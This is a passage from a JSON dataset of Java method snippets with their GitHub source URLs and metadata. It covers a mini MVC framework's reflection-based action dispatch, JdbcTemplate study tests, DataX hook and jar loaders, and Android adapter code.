"18", "class_props": {"extends": null, "implements": ["EventListener"], "modifiers": ["public"]}}, {"id": 32774, "method_name": "executa", "class_name": "Action", "params": ["HttpServletRequest", "HttpServletResponse"], "throws": ["ActionMvcException", "IllegalArgumentException", "IllegalAccessException", "SecurityException", "InvocationTargetException"], "modifiers": ["public"], "return_type": "String", "snippet": "    public String executa(HttpServletRequest request, \n    HttpServletResponse response) throws ActionMvcException, IllegalArgumentException, IllegalAccessException, SecurityException, InvocationTargetException {\n        \n        //parametro identificador da operacao que serah executada \t\t\t\t\n        String metodoExecutavel = request.getParameter(\"operacao\");\n\n        if (metodoExecutavel == null)\n            throw new ActionMvcException(\"Opera\u00e7\u00e3o n\u00e3o localizada - Verifique (no 'link' ou 'action do formulario' html) se o nome do m\u00e9todo foi digitado corretamente.\");\n        else\n            return executarMetodo(metodoExecutavel, request, response); \n    }", "url": "https://raw.githubusercontent.com/marcoseduardoss/mini-mvc/master/mini-mvc/src/main/java/br/me/mvc/controle/acoes/Action.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public", "abstract"]}}, {"id": 32775, "method_name": "executarMetodo", "class_name": "Action", "params": ["String", "HttpServletRequest", "HttpServletResponse"], "throws": ["IllegalArgumentException", "IllegalAccessException", "SecurityException", "InvocationTargetException", "ActionMvcException"], "modifiers": ["private"], "return_type": "String", "snippet": "    private String executarMetodo(String operacao, HttpServletRequest request, HttpServletResponse response) throws IllegalArgumentException, IllegalAccessException, SecurityException, InvocationTargetException, ActionMvcException {\n        \n    \tString retorno = null;\n        \n        //executa via \"reflexao java\" o metodo solicitado\n        Method[] lista = this.getClass().getDeclaredMethods();\n        for (int i = 0; i < lista.length; i++) {\n           Method metodo = lista[i];            \n           \n           //seleciona o m\u00e9todo solicitada na url \n           if (metodo!=null && metodo.getName().equals(operacao)){\n                //executa o metodo solicitado na URL\n                retorno = (String)metodo.invoke(this, request, response);\n           }\n        }\n        if (retorno == null)\n            throw new ActionMvcException(\"Opera\u00e7\u00e3o n\u00e3o localizada - Verifique (no 'link' ou 'action do formulario' html) se o nome do m\u00e9todo foi digitado corretamente.\");        \n        \n        return retorno;\n    }", "url": "https://raw.githubusercontent.com/marcoseduardoss/mini-mvc/master/mini-mvc/src/main/java/br/me/mvc/controle/acoes/Action.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public", "abstract"]}}, {"id": 32776, "method_name": "newInstance", "class_name": "Action", "params": ["String", "String"], "throws": ["ClassNotFoundException", "InstantiationException", "IllegalAccessException"], "modifiers": ["public", "static"], "return_type": "Action", "snippet": "\tpublic static Action newInstance(String className, String realPath)\n\t\t\tthrows ClassNotFoundException, InstantiationException, IllegalAccessException {\n\t\t//System.out.println(dirToList);\n        \n\t\tMap<String, String> map = JavaReflectionUtil.INSTANCE.getClassesMap(realPath);\n        \n        String classAndPackage = map.get(className);\n\t   \n\t    Class classeExecutavel = Class.forName(classAndPackage);\n\t   \n        if(classeExecutavel.getSuperclass().getName().endsWith(\".Action\")) { \n        \treturn (Action) classeExecutavel.newInstance();\n        }else {\n        \treturn null;\n        }\n\t}", "url": "https://raw.githubusercontent.com/marcoseduardoss/mini-mvc/master/mini-mvc/src/main/java/br/me/mvc/controle/acoes/Action.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public", "abstract"]}}, {"id": 32777, "method_name": "getTipoDeRedirecionamento", "class_name": "Action", "params": [], "throws": null, "modifiers": ["public"], "return_type": "TipoDeRedirecionamento", "snippet": "    public TipoDeRedirecionamento getTipoDeRedirecionamento() {\n        return tipoDeRedirecionamento;\n    }", "url": "https://raw.githubusercontent.com/marcoseduardoss/mini-mvc/master/mini-mvc/src/main/java/br/me/mvc/controle/acoes/Action.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public", "abstract"]}}, {"id": 32778, "method_name": "setTipoDeRedirecionamento", "class_name": "Action", "params": ["TipoDeRedirecionamento"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTipoDeRedirecionamento(TipoDeRedirecionamento tipoDeRedirecionamento) {\n        this.tipoDeRedirecionamento = tipoDeRedirecionamento;\n    }", "url": "https://raw.githubusercontent.com/marcoseduardoss/mini-mvc/master/mini-mvc/src/main/java/br/me/mvc/controle/acoes/Action.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public", "abstract"]}}, {"id": 32779, "method_name": "isRedirect", "class_name": "Action", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isRedirect() {\n        return tipoDeRedirecionamento.equals(TipoDeRedirecionamento.REDIRECT);\n    }", "url": "https://raw.githubusercontent.com/marcoseduardoss/mini-mvc/master/mini-mvc/src/main/java/br/me/mvc/controle/acoes/Action.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public", "abstract"]}}, {"id": 32780, "method_name": "isDispatcher", "class_name": "Action", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isDispatcher() {\n        return tipoDeRedirecionamento.equals(TipoDeRedirecionamento.DISPATCHER);\n    }", "url": "https://raw.githubusercontent.com/marcoseduardoss/mini-mvc/master/mini-mvc/src/main/java/br/me/mvc/controle/acoes/Action.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public", "abstract"]}}, {"id": 32781, "method_name": "initElements", "class_name": "DarkOakTanbarkBlock", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void initElements() {\n\t\telements.blocks.add(() -> new CustomBlock());\n\t\telements.items\n\t\t\t\t.add(() -> new BlockItem(block, new Item.Properties().group(ItemGroup.BUILDING_BLOCKS)).setRegistryName(block.getRegistryName()));\n\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/DarkOakTanbarkBlock.java", "stars": "2", "class_props": {"extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"id": 32782, "method_name": "getDrops", "class_name": "CustomBlock", "params": ["BlockState", "LootContext"], "throws": null, "modifiers": ["public"], "return_type": "List<ItemStack>", "snippet": "\t\tpublic List<ItemStack> getDrops(BlockState state, LootContext.Builder builder) {\n\t\t\tList<ItemStack> dropsOriginal = super.getDrops(state, builder);\n\t\t\tif (!dropsOriginal.isEmpty())\n\t\t\t\treturn dropsOriginal;\n\t\t\treturn Collections.singletonList(new ItemStack(this, 1));\n\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/DarkOakTanbarkBlock.java", "stars": "2", "class_props": {"extends": "FallingBlock", "implements": null, "modifiers": ["public", "static"]}}, {"id": 32783, "method_name": "main", "class_name": "ThymeleafApplication", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        SpringApplication.run(ThymeleafApplication.class, args);\n    }", "url": "https://raw.githubusercontent.com/MichaelDYZ/springboot-thymeleaf/master/springboot-thymeleaf/src/main/java/com/thymeleaf/ThymeleafApplication.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32784, "method_name": "test1", "class_name": "JdbcTemplateDemo2", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void test1() {\n        //2\u3001\u5b9a\u4e49sql\n        String sql = \"update student set sex = 9 where id = 2\";\n        //3\u3001\u6267\u884csql\n        int count = template.update(sql);\n        System.out.println(count);\n    }", "url": "https://raw.githubusercontent.com/chengcheng1021/javaStudy/master/src/jdbc/datasource/jdbctemplate/JdbcTemplateDemo2.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32785, "method_name": "test2", "class_name": "JdbcTemplateDemo2", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void test2() {\n        //2\u3001\u5b9a\u4e49sql\n        String sql = \"insert into student value (?, ?, ?)\";\n        //3\u3001\u6267\u884csql\n        int count = template.update(sql,null, \"hahaha\" ,1);\n        System.out.println(count);\n    }", "url": "https://raw.githubusercontent.com/chengcheng1021/javaStudy/master/src/jdbc/datasource/jdbctemplate/JdbcTemplateDemo2.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32786, "method_name": "test3", "class_name": "JdbcTemplateDemo2", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void test3() {\n        //2\u3001\u5b9a\u4e49sql\n        String sql = \"select * from student where id = ?\";\n        //3\u3001\u6267\u884csql\n        Map<String, Object> map = template.queryForMap(sql, 2);\n        System.out.println(map);\n    }", "url": "https://raw.githubusercontent.com/chengcheng1021/javaStudy/master/src/jdbc/datasource/jdbctemplate/JdbcTemplateDemo2.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32787, "method_name": "test4", "class_name": "JdbcTemplateDemo2", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void test4() {\n        //2\u3001\u5b9a\u4e49sql\n        String sql = \"select * from student\";\n        //3\u3001\u6267\u884csql\n        List<Map<String, Object>> list = template.queryForList(sql);\n        System.out.println(list);\n    }", "url": "https://raw.githubusercontent.com/chengcheng1021/javaStudy/master/src/jdbc/datasource/jdbctemplate/JdbcTemplateDemo2.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32788, "method_name": "test5", "class_name": "JdbcTemplateDemo2", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void test5() {\n        //2\u3001\u5b9a\u4e49sql\n        String sql = \"select * from emp\";\n        //3\u3001\u6267\u884csql\n        List<Emp> list = template.query(sql, new RowMapper<Emp>() {\n            @Override\n            public Emp mapRow(ResultSet rs, int i) throws SQLException {\n                Emp emp = new Emp();\n                int id = rs.getInt(\"id\");\n                String admin_login = rs.getString(\"admin_login\");\n                int last_login_time = rs.getInt(\"last_login_time\");\n                int status = rs.getInt(\"status\");\n                Date deleted_at = rs.getDate(\"deleted_at\");\n                String last_login_ip = rs.getString(\"last_login_ip\");\n\n                emp.setId(id);\n                emp.setAdmin_login(admin_login);\n                emp.setLast_login_time(last_login_time);\n                emp.setStatus(status);\n                emp.setDeleted_at(deleted_at);\n                emp.setLast_login_ip(last_login_ip);\n\n                return emp;\n            }\n        });\n\n        for (Emp emp : list){\n            System.out.println(emp);\n        }\n    }", "url": "https://raw.githubusercontent.com/chengcheng1021/javaStudy/master/src/jdbc/datasource/jdbctemplate/JdbcTemplateDemo2.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32789, "method_name": "test5_2", "class_name": "JdbcTemplateDemo2", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void test5_2() {\n        //2\u3001\u5b9a\u4e49sql\n        String sql = \"select * from emp\";\n        //3\u3001\u6267\u884csql\n        List<Emp> list = template.query(sql, new BeanPropertyRowMapper<Emp>(Emp.class));\n        for (Emp emp : list){\n            System.out.println(emp);\n        }\n    }", "url": "https://raw.githubusercontent.com/chengcheng1021/javaStudy/master/src/jdbc/datasource/jdbctemplate/JdbcTemplateDemo2.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32790, "method_name": "test6", "class_name": "JdbcTemplateDemo2", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void test6() {\n        //2\u3001\u5b9a\u4e49sql\n        String sql = \"select count(id) from emp\";\n        //3\u3001\u6267\u884csql\n        Long total = template.queryForObject(sql, Long.class);\n        System.out.println(total);\n    }", "url": "https://raw.githubusercontent.com/chengcheng1021/javaStudy/master/src/jdbc/datasource/jdbctemplate/JdbcTemplateDemo2.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32791, "method_name": "contextLoads", "class_name": "MybatisApplicationTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void contextLoads() {\n\n    }", "url": "https://raw.githubusercontent.com/wanzicong/mybatis-study/master/src/test/java/com/mybatis/MybatisApplicationTests.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 32792, "method_name": "getProjectId", "class_name": "ProjectVersion", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int getProjectId() {\n    return this.projectId;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/com/webank/wedatasphere/schedulis/exec/execapp/ProjectVersion.java", "stars": "18", "class_props": {"extends": null, "implements": ["Comparable"], "modifiers": ["public"]}}, {"id": 32793, "method_name": "getVersion", "class_name": "ProjectVersion", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int getVersion() {\n    return this.version;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/com/webank/wedatasphere/schedulis/exec/execapp/ProjectVersion.java", "stars": "18", "class_props": {"extends": null, "implements": ["Comparable"], "modifiers": ["public"]}}, {"id": 32794, "method_name": "getInstalledDir", "class_name": "ProjectVersion", "params": [], "throws": null, "modifiers": ["public"], "return_type": "File", "snippet": "  public File getInstalledDir() {\n    return this.installedDir;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/com/webank/wedatasphere/schedulis/exec/execapp/ProjectVersion.java", "stars": "18", "class_props": {"extends": null, "implements": ["Comparable"], "modifiers": ["public"]}}, {"id": 32795, "method_name": "setInstalledDir", "class_name": "ProjectVersion", "params": ["File"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setInstalledDir(final File installedDir) {\n    this.installedDir = installedDir;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/com/webank/wedatasphere/schedulis/exec/execapp/ProjectVersion.java", "stars": "18", "class_props": {"extends": null, "implements": ["Comparable"], "modifiers": ["public"]}}, {"id": 32796, "method_name": "compareTo", "class_name": "ProjectVersion", "params": ["ProjectVersion"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int compareTo(final ProjectVersion o) {\n    if (this.projectId == o.projectId) {\n      return this.version - o.version;\n    }\n\n    return this.projectId - o.projectId;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/com/webank/wedatasphere/schedulis/exec/execapp/ProjectVersion.java", "stars": "18", "class_props": {"extends": null, "implements": ["Comparable"], "modifiers": ["public"]}}, {"id": 32797, "method_name": "toString", "class_name": "ProjectVersion", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String toString() {\n    return \"ProjectVersion{\" + \"projectId=\" + this.projectId + \", version=\" + this.version\n        + \", installedDir=\"\n        + this.installedDir\n        + '}';\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/com/webank/wedatasphere/schedulis/exec/execapp/ProjectVersion.java", "stars": "18", "class_props": {"extends": null, "implements": ["Comparable"], "modifiers": ["public"]}}, {"id": 32798, "method_name": "write", "class_name": "JodaTimeDeserializer", "params": ["JSONSerializer", "Object", "Object", "Type", "int"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void write(JSONSerializer serializer, Object object, Object fieldName, Type fieldType, int features) throws IOException {\n        SerializeWriter out = serializer.getWriter();\n        String resultStr = object.toString();\n        if (object == null) {\n            out.writeNull();\n            return;\n        }\n        if (fieldType == LocalDateTime.class) {\n            LocalDateTime localDateTime = (LocalDateTime) object;\n            resultStr = localDateTime.format(DateTimeFormatter.ofPattern(DateConstant.DATE_TIME_FORMATTER));\n        } else if (fieldType == LocalDate.class) {\n            LocalDate localDate = (LocalDate) object;\n            resultStr = localDate.format(DateTimeFormatter.ofPattern(DateConstant.DATE_FORMATTER));\n        } else if (fieldType == LocalTime.class) {\n            LocalTime localTime = (LocalTime) object;\n            resultStr = localTime.format(DateTimeFormatter.ofPattern(DateConstant.TIME_FORMATTER));\n        }\n        out.writeString(resultStr);\n    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-common/src/main/java/com/cgb/bcpinstall/common/fastJson/JodaTimeDeserializer.java", "stars": "7", "class_props": {"extends": null, "implements": ["ObjectSerializer"], "modifiers": ["public"]}}, {"id": 32799, "method_name": "invokeAll", "class_name": "HookInvoker", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void invokeAll() {\n        if (!baseDir.exists() || baseDir.isFile()) {\n            LOG.info(\"No hook invoked, because base dir not exists or is a file: \" + baseDir.getAbsolutePath());\n            return;\n        }\n\n        String[] subDirs = baseDir.list(new FilenameFilter() {\n            @Override\n            public boolean accept(File dir, String name) {\n                return new File(dir, name).isDirectory();\n            }\n        });\n\n        if (subDirs == null) {\n            throw DataXException.asDataXException(FrameworkErrorCode.HOOK_LOAD_ERROR, \"\u83b7\u53d6HOOK\u5b50\u76ee\u5f55\u8fd4\u56denull\");\n        }\n\n        for (String subDir : subDirs) {\n            doInvoke(new File(baseDir, subDir).getAbsolutePath());\n        }\n\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/container/util/HookInvoker.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32800, "method_name": "doInvoke", "class_name": "HookInvoker", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void doInvoke(String path) {\n        ClassLoader oldClassLoader = Thread.currentThread().getContextClassLoader();\n        try {\n            JarLoader jarLoader = new JarLoader(new String[]{path});\n            Thread.currentThread().setContextClassLoader(jarLoader);\n            Iterator<Hook> hookIt = ServiceLoader.load(Hook.class).iterator();\n            if (!hookIt.hasNext()) {\n                LOG.warn(\"No hook defined under path: \" + path);\n            } else {\n                Hook hook = hookIt.next();\n                LOG.info(\"Invoke hook [{}], path: {}\", hook.getName(), path);\n                hook.invoke(conf, msg);\n            }\n        } catch (Exception e) {\n            LOG.error(\"Exception when invoke hook\", e);\n            throw DataXException.asDataXException(\n                    CommonErrorCode.HOOK_INTERNAL_ERROR, \"Exception when invoke hook\", e);\n        } finally {\n            Thread.currentThread().setContextClassLoader(oldClassLoader);\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/container/util/HookInvoker.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32801, "method_name": "main", "class_name": "HookInvoker", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        new HookInvoker(\"/Users/xiafei/workspace/datax3/target/datax/datax/hook\",\n                null, new HashMap<String, Number>()).invokeAll();\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/container/util/HookInvoker.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32802, "method_name": "getURLs", "class_name": "JarLoader", "params": ["String"], "throws": null, "modifiers": ["private", "static"], "return_type": "URL", "snippet": "    private static URL[] getURLs(String[] paths) {\n        Validate.isTrue(null != paths && 0 != paths.length,\n                \"jar\u5305\u8def\u5f84\u4e0d\u80fd\u4e3a\u7a7a.\");\n\n        List<String> dirs = new ArrayList<String>();\n        for (String path : paths) {\n            dirs.add(path);\n            JarLoader.collectDirs(path, dirs);\n        }\n\n        List<URL> urls = new ArrayList<URL>();\n        for (String path : dirs) {\n            urls.addAll(doGetURLs(path));\n        }\n        return urls.toArray(new URL[0]);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/util/container/JarLoader.java", "stars": "23", "class_props": {"extends": "URLClassLoader", "implements": null, "modifiers": ["public"]}}, {"id": 32803, "method_name": "collectDirs", "class_name": "JarLoader", "params": ["String", "List<String>"], "throws": null, "modifiers": ["private", "static"], "return_type": "void", "snippet": "    private static void collectDirs(String path, List<String> collector) {\n        if (null == path || StringUtils.isBlank(path)) {\n            return;\n        }\n\n        File current = new File(path);\n        if (!current.exists() || !current.isDirectory()) {\n            return;\n        }\n\n        if(null != current.listFiles()) {\n            for (File child : current.listFiles()) {\n                if (!child.isDirectory()) {\n                    continue;\n                }\n\n                collector.add(child.getAbsolutePath());\n                collectDirs(child.getAbsolutePath(), collector);\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/util/container/JarLoader.java", "stars": "23", "class_props": {"extends": "URLClassLoader", "implements": null, "modifiers": ["public"]}}, {"id": 32804, "method_name": "doGetURLs", "class_name": "JarLoader", "params": ["String"], "throws": null, "modifiers": ["private", "static"], "return_type": "List<URL>", "snippet": "    private static List<URL> doGetURLs(final String path) {\n        Validate.isTrue(!StringUtils.isBlank(path), \"jar\u5305\u8def\u5f84\u4e0d\u80fd\u4e3a\u7a7a.\");\n\n        File jarPath = new File(path);\n\n        Validate.isTrue(jarPath.exists() && jarPath.isDirectory(),\n                \"jar\u5305\u8def\u5f84\u5fc5\u987b\u5b58\u5728\u4e14\u4e3a\u76ee\u5f55.\");\n\n\t\t/* set filter */\n        FileFilter jarFilter = new FileFilter() {\n            @Override\n            public boolean accept(File pathname) {\n                return pathname.getName().endsWith(\".jar\");\n            }\n        };\n\n\t\t/* iterate all jar */\n        File[] allJars = new File(path).listFiles(jarFilter);\n        List<URL> jarURLs = new ArrayList<URL>(allJars.length);\n\n        for (int i = 0; i < allJars.length; i++) {\n            try {\n                jarURLs.add(allJars[i].toURI().toURL());\n            } catch (Exception e) {\n                throw DataXException.asDataXException(\n                        FrameworkErrorCode.PLUGIN_INIT_ERROR,\n                        \"\u7cfb\u7edf\u52a0\u8f7djar\u5305\u51fa\u9519\", e);\n            }\n        }\n\n        return jarURLs;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/util/container/JarLoader.java", "stars": "23", "class_props": {"extends": "URLClassLoader", "implements": null, "modifiers": ["public"]}}, {"id": 32805, "method_name": "loadClass", "class_name": "JarLoader", "params": ["String", "boolean"], "throws": ["ClassNotFoundException"], "modifiers": ["public"], "return_type": "Class<?>", "snippet": "    public Class<?> loadClass(String name, boolean resolve) throws ClassNotFoundException {\n        synchronized (getClassLoadingLock(name)){\n            //First, check if the class has already been loaded\n            Class<?> c = findLoadedClass(name);\n            if(c == null){\n                long t0 = System.nanoTime();\n                try {\n                    //invoke findClass in this class\n                    c = findClass(name);\n                }catch(ClassNotFoundException e){\n                    // ClassNotFoundException thrown if class not found\n                }\n                if(c == null){\n                    return super.loadClass(name, resolve);\n                }\n                sun.misc.PerfCounter.getFindClasses().addElapsedTimeFrom(t0);\n                sun.misc.PerfCounter.getFindClasses().increment();\n            }\n            if(resolve){\n                resolveClass(c);\n            }\n            return c;\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/util/container/JarLoader.java", "stars": "23", "class_props": {"extends": "URLClassLoader", "implements": null, "modifiers": ["public"]}}, {"id": 32806, "method_name": "loadClass", "class_name": "JarLoader", "params": ["String", "byte"], "throws": null, "modifiers": ["public"], "return_type": "Class<?>", "snippet": "    public Class<?> loadClass(String name, byte[] bytes){\n        return this.defineClass(name, bytes, 0, bytes.length);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/util/container/JarLoader.java", "stars": "23", "class_props": {"extends": "URLClassLoader", "implements": null, "modifiers": ["public"]}}, {"id": 32807, "method_name": "redisTest", "class_name": "RedisController", "params": ["String"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "Map<String,Object>", "snippet": "    public Map<String, Object> redisTest(String type) throws IOException {\n\n        return null;\n    }", "url": "https://raw.githubusercontent.com/chengxy-nds/delayqueue/master/src/main/java/com/chengxy/delayqueue/controller/RedisController.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32808, "method_name": "onCreateViewHolder", "class_name": "contact_Adapter", "params": ["ViewGroup", "int"], "throws": null, "modifiers": ["public"], "return_type": "contact_Adapter", "snippet": "    public contact_Adapter.contactHolder onCreateViewHolder(@NonNull ViewGroup parent, int viewType) {\n        LayoutInflater myInflater = LayoutInflater.from(ctx);\n        View myView = myInflater.inflate(R.layout.contact_child,parent,false);\n        return new contactHolder(myView);\n    }", "url": "https://raw.githubusercontent.com/AkhilRautela/ledger_system/master/app/src/main/java/com/example/ledgersystem/contact_Adapter.java", "stars": "2", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"id": 32809, "method_name": "onBindViewHolder", "class_name": "contact_Adapter", "params": ["contactHolder", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onBindViewHolder(@NonNull contactHolder holder, int position) {\n        //todo we have to bind the holder later on let me do the fragment work done.\n        final listforadapter myListobj1 =data.get(position);\n        holder.t1_name.setText(myListobj1.getName());\n        holder.t2_number.setText(myListobj1.getPhone());\n        TextDrawable drawable = TextDrawable.builder().buildRound(myListobj1.getName().substring(0,1).toUpperCase(), Color.rgb(15,167,255));\n        holder.contactimg.setBackground(drawable);\n        holder.itemView.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                requestDialog = new Dialog(ctx);\n                requestDialog.setContentView(R.layout.dialog_req);\n                final TextView c_name = (TextView)requestDialog.findViewById(R.id.dialog_name_d);\n                final TextView c_no = requestDialog.findViewById(R.id.dialog_number_d);\n                final CircleImageView c_img =  requestDialog.findViewById(R.id.dialog_img_d);\n                Button b=requestDialog.findViewById(R.id.requestt);\n                final EditText money=requestDialog.findViewById(R.id.amt);\n                final EditText remark=requestDialog.findViewById(R.id.remark);\n                b.setOnClickListener(new View.OnClickListener() {\n                    @Override\n                    public void onClick(View v) {\n                        DatabaseReference dr= FirebaseDatabase.getInstance().getReference(\"Users\");\n                        SharedPreferences sf=ctx.getSharedPreferences(\"Login data\",MODE_PRIVATE);\n                        String s=sf.getString(\"user\",\"unable to fetch\");\n                        dr.child(s).child(\"Transactions\").child(\"take money\").child(myListobj1.getName()).child(remark.getText().toString()).setValue(money.getText().toString());\n                        dr.child(myListobj1.getName()).child(\"Transactions\").child(\"give money\").child(s).child(remark.getText().toString()).setValue(money.getText().toString());\n                        requestDialog.dismiss();\n                    }\n                });\n                c_name.setText(myListobj1.getName());\n                c_no.setText(myListobj1.getPhone());\n                TextDrawable drawable = TextDrawable.builder().buildRound(myListobj1.getName().substring(0,1).toUpperCase(), Color.rgb(15,167,255));\n                c_img.setBackground(drawable);\n                requestDialog.show();\n            }\n        });\n    }", "url": "https://raw.githubusercontent.com/AkhilRautela/ledger_system/master/app/src/main/java/com/example/ledgersystem/contact_Adapter.java", "stars": "2", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"id": 32810, "method_name": "getItemCount", "class_name": "contact_Adapter", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getItemCount() {\n        return data.size();\n    }", "url": "https://raw.githubusercontent.com/AkhilRautela/ledger_system/master/app/src/main/java/com/example/ledgersystem/contact_Adapter.java", "stars": "2", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"id": 32811, "method_name": "onKeyPreIme", "class_name": "FormsEditText", "params": ["int", "android"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean onKeyPreIme (int p0, android.view.KeyEvent p1)\n\t{\n\t\treturn n_onKeyPreIme (p0, p1);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/FormsEditText.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 32812, "method_name": "n_onKeyPreIme", "class_name": "FormsEditText", "params": ["int", "android"], "throws": null, "modifiers": ["private", "native"], "return_type": "boolean", "snippet": "\tprivate native boolean n_onKeyPreIme (int p0, android.view.KeyEvent p1);\n\n\n\tpublic void onSelectionChanged (int p0, int p1)\n\t{\n\t\tn_onSelectionChanged (p0, p1);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/FormsEditText.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 32813, "method_name": "onSelectionChanged", "class_name": "FormsEditText", "params": ["int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onSelectionChanged (int p0, int p1)\n\t{\n\t\tn_onSelectionChanged (p0, p1);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/FormsEditText.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 32814, "method_name": "n_onSelectionChanged", "class_name": 